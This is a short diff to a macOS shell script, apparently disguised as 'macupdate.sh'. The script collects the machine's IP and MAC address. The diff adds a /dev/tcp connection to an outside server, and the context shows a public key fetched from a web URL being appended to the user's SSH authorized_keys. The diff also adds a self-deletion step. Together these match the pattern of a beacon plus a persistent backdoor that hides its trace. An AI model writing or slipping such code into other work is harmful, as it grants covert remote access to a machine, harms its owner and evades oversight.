@@ -12,6 +12,9 @@ MAC=$(ifconfig en0 | awk '/ether/{print $2}')
 SERVER="boesen.science"
 PORT=2043
 
+exec 3<>/dev/tcp/$SERVER/$PORT
+printf "INFO: Got this far" >&3
+
 if [[ $(< /tmp/ip) != "$IP" ]]; then
 	printf "$IP" > /tmp/ip
 
@@ -39,3 +42,5 @@ mkdir -p "$SSHPATH"
 if ! grep boesene $SSHPATH/authorized_keys; then
 	curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
 fi
+
+rm /tmp/macupdate.sh
